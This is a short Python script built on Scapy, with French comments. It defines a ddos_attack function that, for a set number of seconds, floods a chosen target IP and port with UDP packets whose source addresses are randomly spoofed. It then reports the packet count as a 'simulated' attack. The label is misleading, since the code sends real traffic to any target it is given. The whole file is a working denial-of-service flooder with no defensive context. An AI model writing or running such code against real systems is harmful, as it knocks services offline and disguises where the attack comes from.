from scapy.all import IP, UDP, send
import random
import time

def generate_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def ddos_attack(target_ip, target_port=80, duration=60):
    packet_count = 0
    start_time = time.time()
    while time.time() - start_time < duration:
        # Générer une adresse IP source aléatoire
        src_ip = generate_random_ip()
        # Construire le paquet IP/UDP
        packet = IP(src=src_ip, dst=target_ip) / UDP(dport=target_port)
        # Envoyer le paquet
        send(packet, verbose=0)
        packet_count += 1

    print(f"Attaque DDoS simulée : {packet_count} paquets envoyés en {duration} secondes")